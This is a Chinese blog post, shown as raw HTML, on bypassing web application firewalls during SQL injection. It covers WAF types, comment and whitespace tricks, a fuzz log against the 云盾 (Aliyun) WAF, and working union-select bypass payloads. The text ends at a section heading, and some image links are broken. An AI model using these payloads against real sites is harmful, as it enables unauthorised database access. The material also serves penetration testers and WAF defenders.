<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta name="description" content="0x00 前言   去年到现在就一直有人希望我出一篇关于waf绕过的文章，我觉得这种老生常谈的话题也没什么可写的。很多人一遇到waf就发懵，不知如何是好，能搜到的各种姿势也是然并卵。但是积累姿势的过程也是迭代的，那么就有了此文，用来总结一些学习和培养突破waf的思想。可能总结的并不全，但目的并不是讲那些网上搜来一大把的东西，So…并不会告诉大家现有的姿势，而是突破Waf Bypass思维定势达到独">
<meta property="og:type" content="article">
<meta property="og:title" content="sql注入绕waf">
<meta property="og:url" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/index.html">
<meta property="og:site_name" content="一灯和尚">
<meta property="og:description" content="0x00 前言   去年到现在就一直有人希望我出一篇关于waf绕过的文章，我觉得这种老生常谈的话题也没什么可写的。很多人一遇到waf就发懵，不知如何是好，能搜到的各种姿势也是然并卵。但是积累姿势的过程也是迭代的，那么就有了此文，用来总结一些学习和培养突破waf的思想。可能总结的并不全，但目的并不是讲那些网上搜来一大把的东西，So…并不会告诉大家现有的姿势，而是突破Waf Bypass思维定势达到独">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_1_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_3_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_3_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_3_3.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_6_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_6_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_8_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_8_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_9_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_9_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_11_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_11_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_13_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_13_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_13_3.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_14_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_14_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_14_3.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_15_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_15_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_16_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_16_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_17_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_17_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_17_3.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_18_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_19_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_19_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_20_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_20_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_21_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_21_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_22_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_23_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_23_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_23_3.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_24_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_24_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_25_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_25_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_25_3.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_26_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_26_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_26_3.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_27_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_27_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_28_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_28_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_29_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_29_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_30_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_30_2.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_30_3.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_31_1.jpg">
<meta property="og:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_31_2.jpg">
<meta property="article:published_time" content="2021-06-29T14:43:59.000Z">
<meta property="article:modified_time" content="2021-06-29T15:20:26.612Z">
<meta property="article:author" content="一灯和尚">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_1_1.jpg">

<link rel="canonical" href="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>

  <title>sql注入绕waf | 一灯和尚</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">一灯和尚</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">沉迷学习，无法自拔</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>

  </li>
        <li class="menu-item menu-item-about">

    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>

  <a href="https://github.com/mrknow001" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content post posts-expand">
            

    
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/46807619.jpg">
      <meta itemprop="name" content="一灯和尚">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="一灯和尚">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
          sql注入绕waf
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-06-29 22:43:59 / 修改时间：23:20:26" itemprop="dateCreated datePublished" datetime="2021-06-29T22:43:59+08:00">2021-06-29</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Bypass/" itemprop="url" rel="index"><span itemprop="name">Bypass</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
        <h4 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><strong>0x00 前言</strong></h4><blockquote>
<p>  去年到现在就一直有人希望我出一篇关于waf绕过的文章，我觉得这种老生常谈的话题也没什么可写的。很多人一遇到waf就发懵，不知如何是好，能搜到的各种姿势也是然并卵。但是积累姿势的过程也是迭代的，那么就有了此文，用来总结一些学习和培养突破waf的思想。可能总结的并不全，但目的并不是讲那些网上搜来一大把的东西，So…并不会告诉大家现有的姿势，而是突破Waf Bypass思维定势达到独立去挖掘waf的设计缺陷和如何实现自动化的Waf Bypass（这里只讲主流waf的黑盒测试）</p>
</blockquote>
<h4 id="0x01-搞起"><a href="#0x01-搞起" class="headerlink" title="0x01 搞起"></a><strong>0x01 搞起</strong></h4><p>  当我们遇到一个waf时，要确定是什么类型的？先来看看主流的这些waf，狗、盾、神、锁、宝、卫士等等。。。（在测试时不要只在官网测试，因为存在版本差异导致规则库并不一致）</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_1_1.jpg">

<p>  我们要搞清楚遇到的waf是怎么工作的（很重要）主要分为：</p>
<h5 id="1、云waf："><a href="#1、云waf：" class="headerlink" title="1、云waf："></a>1、云waf：</h5><blockquote>
<p>在配置云waf时（通常是CDN包含的waf），DNS需要解析到CDN的ip上去，在请求uri时，数据包就会先经过云waf进行检测，如果通过再将数据包流给主机。</p>
</blockquote>
<h5 id="2、主机防护软件："><a href="#2、主机防护软件：" class="headerlink" title="2、主机防护软件："></a>2、主机防护软件：</h5><blockquote>
<p>在主机上预先安装了这种防护软件，可用于扫描和保护主机（废话），和监听web端口的流量是否有恶意的，所以这种从功能上讲较为全面。这里再插一嘴，mod_security、ngx-lua-waf这类开源waf虽然看起来不错，但是有个弱点就是升级的成本会高一些。</p>
</blockquote>
<h5 id="3、硬件ips-ids防护、硬件waf（这里先不讲）"><a href="#3、硬件ips-ids防护、硬件waf（这里先不讲）" class="headerlink" title="3、硬件ips/ids防护、硬件waf（这里先不讲）"></a>3、硬件ips/ids防护、硬件waf（这里先不讲）</h5><blockquote>
<p>使用专门硬件防护设备的方式，当向主机请求时，会先将流量经过此设备进行流量清洗和拦截，如果通过再将数据包流给主机。</p>
</blockquote>
<p>  再来说明下某些潜规则（关系）：</p>
<ul>
<li>百度云加速免费版节点基于CloudFlare</li>
<li>安全宝和百度云加速规则库相似</li>
<li>创宇云安全和腾讯云安全规则库相似</li>
<li>腾讯云安全和<a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/63">门神</a>规则库相似</li>
<li>硬件waf自身漏洞往往一大堆</li>
</ul>
<p>  当Rule相似时，会导致一个问题，就比如和双胞胎结婚晓得吧？嗯。</p>
<h4 id="0x02-司空见惯"><a href="#0x02-司空见惯" class="headerlink" title="0x02 司空见惯"></a><strong>0x02 司空见惯</strong></h4><blockquote>
<p>我们还需要把各种特性都记牢，在运用时加以变化会很有效果。</p>
</blockquote>
<p><code>数据库特性</code>：</p>
<ul>
<li>注释：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">--</span><br><span class="line">-- -</span><br><span class="line">--+</span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*letmetest*&#x2F;</span><br><span class="line">;%00</span><br></pre></td></tr></table></figure>

<p>利用注释简单绕过云锁的一个案例：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_3_1.jpg">

<p>拦截的，但/<strong>/ &gt; 1个就可以绕过了，也就是/</strong>//**/以上都可以。</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_3_2.jpg">

<ul>
<li><p>科学记数法：</p>
<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_3_3.jpg"></li>
<li><p>空白字符：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SQLite3 0A 0D 0C 09 20 </span><br><span class="line">MySQL5 09 0A 0B 0C 0D A0 20 </span><br><span class="line">PosgresSQL 0A 0D 0C 09 20 </span><br><span class="line">Oracle 11g 00 0A 0D 0C 09 20 </span><br><span class="line">MSSQL 01,02,03,04,05,06,07,08,09,0A,0B,0C,0D,0E,0F,10,11,12,13,14,15,16,17,18,19,1A,1B,1C,1D,1E,1F,20</span><br></pre></td></tr></table></figure></li>
<li><p>+号：</p>
<p>![我的WafBypass之道（SQL注入篇）_4_1](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_4_1.jpg”&gt;</p>
</li>
<li><p>-号：</p>
<p>![我的WafBypass之道（SQL注入篇）_4_2](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_4_2.jpg”&gt;</p>
</li>
<li><p>``符号：</p>
<p>![我的WafBypass之道（SQL注入篇）_4_3](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_4_3.jpg”&gt;</p>
</li>
<li><p>~号：</p>
<p>![我的WafBypass之道（SQL注入篇）_4_4](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_4_4.jpg”&gt;</p>
</li>
<li><p>!号：</p>
<p>![我的WafBypass之道（SQL注入篇）_4_5](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_4_5.jpg”&gt;</p>
</li>
<li><p>@<code>形式</code>：</p>
<p>![我的WafBypass之道（SQL注入篇）_4_6](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_4_6.jpg”&gt;</p>
</li>
<li><p>点号.1：</p>
<p>![我的WafBypass之道（SQL注入篇）_4_7](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_4_7.jpg”&gt;</p>
</li>
<li><p>单引号双引号：</p>
<p>![我的WafBypass之道（SQL注入篇）_5_1](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_5_1.jpg”&gt;</p>
</li>
<li><p>括号select(1)：</p>
<p>![我的WafBypass之道（SQL注入篇）_5_2](E:\blog\myblog\source_posts\SQL注入绕waf/我的WafBypass之道（SQL注入篇）_5_2.jpg”&gt;</p>
</li>
</ul>
<p>试试union(select)云盾会不会拦截</p>
<ul>
<li>花括号：</li>
</ul>
<p>这里举一个云盾的案例，并附上当时fuzz的过程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">union+select 拦截</span><br><span class="line">select+from 不拦截</span><br><span class="line">select+from+表名 拦截</span><br><span class="line">union(select) 不拦截</span><br><span class="line">所以可以不用在乎这个union了。</span><br><span class="line">union(select user from ddd) 拦截</span><br><span class="line">union(select%0aall) 不拦截</span><br><span class="line">union(select%0aall user from ddd) 拦截</span><br><span class="line">fuzz下select%0aall与字段之间 + 字段与from之间 + from与表名之间 + 表名与末尾圆括号之间可插入的符号。</span><br><span class="line">union(select%0aall&#123;user&#125;from&#123;ddd&#125;) 不拦截。</span><br></pre></td></tr></table></figure>

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_6_1.jpg">
 Bypass Payload：

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 union(select%0aall&#123;x users&#125;from&#123;x ddd&#125;)</span><br><span class="line">1 union(select%0adistinct&#123;x users&#125;from&#123;x ddd&#125;)</span><br><span class="line">1 union(select%0adistinctrow&#123;x users&#125;from&#123;x ddd&#125;)</span><br></pre></td></tr></table></figure>

<img src="/2021/06/29/SQL%E6%B3%A8%E5%85%A5%E7%BB%95waf/我的WafBypass之道（SQL注入篇）_6_2.jpg">

<p>可运用的sql函数&amp;关键字：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">MySQL：</span><br><span class="line">union distinct</span><br><span class="line">union distinctrow</span><br><span class="line">procedure analyse()</span><br><span class="line">updatexml()</span><br><span class="line">extracavalue()</span><br><span class="line">exp()</span><br><span class="line">ceil()</span><br><span class="line">atan()</span><br><span class="line">sqrt()</span><br><span class="line">floor()</span><br><span class="line">ceiling()</span><br><span class="line">tan()</span><br><span class="line">rand()</span><br><span class="line">sign()</span><br><span class="line">greatest()</span><br><span class="line">字符串截取函数</span><br><span class="line">Mid(version(),1,1)</span><br><span class="line">Substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Lpad(version(),1,1)</span><br><span class="line">Rpad(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line">reverse(right(reverse(version()),1)</span><br><span class="line">字符串连接函数</span><br><span class="line">concat(version(),&#39;|&#39;,user());</span><br><span class="line">concat_ws(&#39;|&#39;,1,2,3)</span><br><span class="line">字符转换</span><br><span class="line">Char(49)</span><br><span class="line">Hex(&#39;a&#39;)</span><br><span class="line">Unhex(61)</span><br><span class="line">过滤了逗号</span><br><span class="line">(1)limit处的逗号：</span><br><span class="line">limit 1 offset 0</span><br><span class="line">(2)字符串截取处的逗号</span><br><span class="line">mid处的逗号：</span><br><span class="line">mid(version() from 1 for 1)</span><br><span class="line"></span><br><span class="line">MSSQL：</span><br><span class="line">IS_SRVROLEMEMBER()</span><br><span class="line">IS_MEMBER()</span><br><span class="line">HAS_DBACCESS()</span><br><span class="line">convert()</span><br><span class="line">col_name()</span><br><span class="line">object_id()</span><br><span class="line">is_srvrolemember()</span><br><span class="line">is_member()</span><br><span class="line">字符串截取函数</span><br><span class="line">Substring(@@version,1,1)</span><br><span class="line">Left(@@version,1)</span><br><span class="line">Right(@@version,1)</span><br><span class="line">(2)字符串转换函数</span><br><span class="line">Ascii(&#39;a&#39;) 这里的函数可以在括号之间添加空格的，一些waf过滤不严会导致bypass</span><br><span class="line">Char(&#39;97&#39;)</span><br><span class="line">exec</span><br></pre></td></tr></table></figure>

<p>Mysql BIGINT数据类型构造溢出型报错注入：<a target="_blank" rel="noopener" href="http://www.thinkings.org/2015/08/10/bigint-overflow-error-sqli.html">BIGINT Overflow Error Based SQL Injection</a></p>
<p><code>容器特性</code>：</p>
<ul>
<li>%特性：</li>
</ul>
